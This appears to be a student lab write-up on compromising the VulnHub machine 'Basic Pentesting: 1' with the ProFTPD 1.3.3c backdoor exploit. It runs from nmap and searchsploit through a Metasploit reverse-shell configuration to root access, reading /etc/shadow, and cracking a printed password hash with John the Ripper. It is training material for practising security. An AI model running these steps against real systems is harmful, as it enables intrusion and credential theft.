# Lab #03 — Basic Pentesting: 1

## 1. Objective

The objective of this lab was to exploit the vulnerable virtual machine **Basic Pentesting: 1**, identify exposed services, use the **Metasploit Framework** to exploit a vulnerable service, and obtain administrator/root privileges.

This lab focused especially on understanding the utility of Metasploit, including how to search for exploit modules, configure module options, select a payload, and execute an exploit against a vulnerable target.

Reference walkthrough used during the lab:

* https://infosecwriteups.com/basic-pentesting-1-walkthrough-vulnhub-4dac91b416ff

---

## 2. Lab Environment

The environment used for this lab was composed of:

| Component               | Description                                                                 |
| ----------------------- | --------------------------------------------------------------------------- |
| Attacking machine       | Kali Linux                                                                  |
| Target machine          | Basic Pentesting: 1                                                         |
| Virtualization software | Oracle VirtualBox                                                           |
| Target IP               | `192.168.0.5`                                                               |
| Main tools used         | `ip`, `nmap`, `searchsploit`, Metasploit, `ssh`, `python3`, John the Ripper |

---

## 3. VM Setup

First, I prepared the vulnerable machine:

1. Downloaded the `basic_pentesting_1.ova` file.
2. Opened Oracle VirtualBox.
3. Imported the `basic_pentesting_1.ova` appliance.
4. Started the Basic Pentesting virtual machine.
5. Used Kali Linux as the attacking machine.

After starting the VM, I needed to identify its IP address on the network.

---

## 4. Network Discovery

To identify my network interface and IP address, I used:

```bash
ip a
```

After checking my network, I scanned the subnet using Nmap:

```bash
sudo nmap -sn 192.168.0.16/24
```

The scan found the target VM:

```text
Nmap scan report for 192.168.0.5
Host is up (0.0097s latency).
MAC Address: 08:00:27:04:22:EF (Oracle VirtualBox virtual NIC)
```

The MAC address indicated that the machine was running through Oracle VirtualBox, so I identified `192.168.0.5` as the target VM.

---

## 5. Port Scanning

After finding the target IP, I scanned all TCP ports and enabled service/version detection:

```bash
nmap -sC -sV -p- --open 192.168.0.5
```

The scan returned the following result:

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-20 00:04 +0100
Nmap scan report for 192.168.0.5
Host is up (0.000097s latency).
Not shown: 65532 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

MAC Address: 08:00:27:04:22:EF (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

The most relevant finding was the FTP service running on port `21`:

```text
ProFTPD 1.3.3c
```

This version is known to be vulnerable due to a backdoor that allows remote command execution.

---

## 6. Vulnerability Identification

To search for known exploits related to ProFTPD 1.3.3c, I used `searchsploit`:

```bash
searchsploit proftpd 1.3.3c
```

The result showed two relevant exploits:

```text
ProFTPD 1.3.3c - Compromised Source Backdoor Remote Code Execution
ProFTPD 1.3.3c - Backdoor Command Execution (Metasploit)
```

This confirmed that the FTP service could be exploited using a known Metasploit module.

<img width="908" height="604" alt="Searchsploit and Metasploit start" src="https://github.com/user-attachments/assets/2d2c18cd-901a-4ecc-9abb-5d8cdf8cc1ff" />

---

## 7. Starting Metasploit

I started the Metasploit Framework with:

```bash
msfconsole
```

Metasploit is useful because it provides a structured way to search, configure, and execute exploits. Instead of manually writing exploit code, it allows the attacker to choose an existing exploit module, configure the target, select a payload, and run the attack.

Inside Metasploit, I searched for ProFTPD modules:

```text
search proftpd
```

Among the available modules, I selected:

```text
exploit/unix/ftp/proftpd_133c_backdoor
```

This module exploits the ProFTPD 1.3.3c backdoor vulnerability.

<img width="1452" height="532" alt="Metasploit ProFTPD exploit selection" src="https://github.com/user-attachments/assets/773e8a67-c621-4f28-836a-7b50760a7843" />

---

## 8. Configuring the Metasploit Exploit

I selected the exploit module with:

```text
use exploit/unix/ftp/proftpd_133c_backdoor
```

Then I checked the required options:

```text
show options
```

The module required the target host and target port:

```text
Module options (exploit/unix/ftp/proftpd_133c_backdoor):

Name    Current Setting  Required  Description
----    ---------------  --------  -----------
RHOSTS                   yes       The target host(s)
RPORT   21               yes       The target port (TCP)
```

I configured the target IP:

```text
set RHOSTS 192.168.0.5
```

The result was:

```text
RHOSTS => 192.168.0.5
```

The target port was already set to `21`, which was correct because the vulnerable ProFTPD service was running on FTP.

---

## 9. Payload Selection

After setting the target, I listed the available payloads:

```text
show payloads
```

<img width="1128" height="310" alt="Metasploit payload list" src="https://github.com/user-attachments/assets/747f2ffd-b7bd-40c6-9f4e-64ca97c2db8b" />

I selected a Unix reverse command shell payload:

```text
set PAYLOAD cmd/unix/reverse
```

This payload makes the target machine connect back to the attacking machine and open a command shell.

<img width="816" height="501" alt="Metasploit payload configuration" src="https://github.com/user-attachments/assets/72d50d3b-16d9-48ec-a490-86bf17c9f7b8" />

After selecting the payload, I needed to configure `LHOST`.

`LHOST` represents the IP address of the attacking machine, where the reverse shell connection will be received.

I set it with:

```text
set LHOST 192.168.0.16
```

<img width="816" height="394" alt="Metasploit LHOST configuration" src="https://github.com/user-attachments/assets/3df24708-13e5-484d-ba4a-b93e357f1f61" />

The main Metasploit configuration was therefore:

```text
RHOSTS  192.168.0.5
RPORT   21
PAYLOAD cmd/unix/reverse
LHOST   192.168.0.16
LPORT   4444
```

---

## 10. Exploitation

After configuring the exploit, I executed it with:

```text
exploit
```

The exploit successfully opened a command shell session:

```text
[*] Started reverse TCP double handler on 192.168.0.16:4444
[*] 192.168.0.5:21 - Sending Backdoor Command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command shell session 1 opened
```

To confirm the privilege level, I used:

```bash
whoami
```

The output was:

```text
root
```

I also checked the user ID:

```bash
id
```

The output confirmed root privileges:

```text
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
```

This means the exploit provided direct root access to the target machine.

<img width="1079" height="866" alt="Root shell and shadow file" src="https://github.com/user-attachments/assets/3bcdae73-403a-4d96-b334-c1917caa47c6" />

---

## 11. Spawning an Interactive Shell

The initial shell obtained through Metasploit was a basic command shell. To make it more interactive, I used Python to spawn a Bash shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This step is useful because a spawned shell behaves more like a normal terminal and makes post-exploitation commands easier to execute.

---

## 12. Reading the Shadow File

Since I had root privileges, I could inspect the `/etc/shadow` file:

```bash
cat /etc/shadow
```

The `/etc/shadow` file stores password hashes for local system users. It is normally only readable by privileged users.

I searched for the user `marlinspike` and found the following hash:

```text
marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::
```

The `$6$` prefix indicates that the password hash uses SHA-512 crypt.

---

## 13. Cracking the Password with John the Ripper

To crack the password, I copied the `marlinspike` hash to a new file on Kali:

```bash
nano marlinspikePass.txt
```

Then I used John the Ripper:

```bash
john marlinspikePass.txt
```

John successfully cracked the hash and recovered the password:

```text
marlinspike
```

I confirmed the result with:

```bash
john --show marlinspikePass.txt
```

The output showed:

```text
marlinspike:marlinspike:17484:0:99999:7:::
```

<img width="630" height="405" alt="John the Ripper cracking marlinspike password" src="https://github.com/user-attachments/assets/2d3dea3d-7a41-4354-9712-c50fe553aa58" />

---

## 14. Tools Used

| Tool                 | Purpose                                                          |
| -------------------- | ---------------------------------------------------------------- |
| `ip`                 | Checked the local network interface and IP address.              |
| `nmap`               | Discovered the target machine and scanned open ports/services.   |
| `searchsploit`       | Searched for known public exploits related to ProFTPD 1.3.3c.    |
| Metasploit Framework | Selected, configured, and executed the ProFTPD backdoor exploit. |
| `python3`            | Spawned a more interactive shell after exploitation.             |
| `cat`                | Read system files such as `/etc/shadow`.                         |
| John the Ripper      | Cracked the password hash for the user `marlinspike`.            |

---

## 15. Vulnerabilities Identified

| Vulnerability                           | Description                                                    | Impact                                                         |
| --------------------------------------- | -------------------------------------------------------------- | -------------------------------------------------------------- |
| Vulnerable FTP service                  | The target was running ProFTPD 1.3.3c.                         | Allowed exploitation of a known backdoor vulnerability.        |
| Remote command execution                | The ProFTPD backdoor allowed commands to be executed remotely. | Provided a root shell on the target machine.                   |
| Password hash exposure after compromise | Root access allowed reading `/etc/shadow`.                     | Enabled extraction and cracking of local user password hashes. |
| Weak password                           | The user `marlinspike` had the password `marlinspike`.         | The password was easily cracked using John the Ripper.         |

---

## 16. Difficulties and Notes

The main difficulty in this lab was configuring Metasploit correctly. It was important to understand the difference between:

| Option    | Meaning                                                           |
| --------- | ----------------------------------------------------------------- |
| `RHOSTS`  | The target machine IP address.                                    |
| `RPORT`   | The vulnerable target port.                                       |
| `LHOST`   | The attacking machine IP address that receives the reverse shell. |
| `LPORT`   | The local port used by the reverse shell handler.                 |
| `PAYLOAD` | The code executed after successful exploitation.                  |

Another difficulty was spawning an interactive shell. Initially, I used the wrong Python command. The correct command was:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This lab also demonstrated why it is important to keep services updated. The whole compromise was possible because the FTP service was running a vulnerable ProFTPD version.

---

## 17. Conclusion

This lab demonstrated a full exploitation process against the vulnerable VM **Basic Pentesting: 1**.

The process started with network discovery and port scanning. Nmap revealed that the target machine was exposing FTP, SSH, and HTTP services. The FTP service was running **ProFTPD 1.3.3c**, which is known to contain a backdoor vulnerability.

Using `searchsploit`, I confirmed that public exploits existed for this version. Then, using the Metasploit Framework, I selected the `proftpd_133c_backdoor` module, configured the target address, selected a reverse shell payload, and executed the exploit.

The exploit successfully opened a root shell on the target machine. After obtaining root access, I inspected the `/etc/shadow` file, extracted the password hash for the user `marlinspike`, and cracked it with John the Ripper. The recovered password was `marlinspike`.

The main lessons learned from this lab were:

* Enumeration is essential before exploitation.
* Service version detection can reveal critical vulnerabilities.
* Metasploit simplifies exploitation by organizing exploits and payloads into reusable modules.
* Correctly configuring `RHOSTS`, `RPORT`, `LHOST`, `LPORT`, and `PAYLOAD` is essential.
* Outdated or backdoored services can lead to full system compromise.
* Weak passwords are easy to crack once password hashes are exposed.

At the end of the lab, root access was successfully obtained and the password for the user `marlinspike` was recovered.
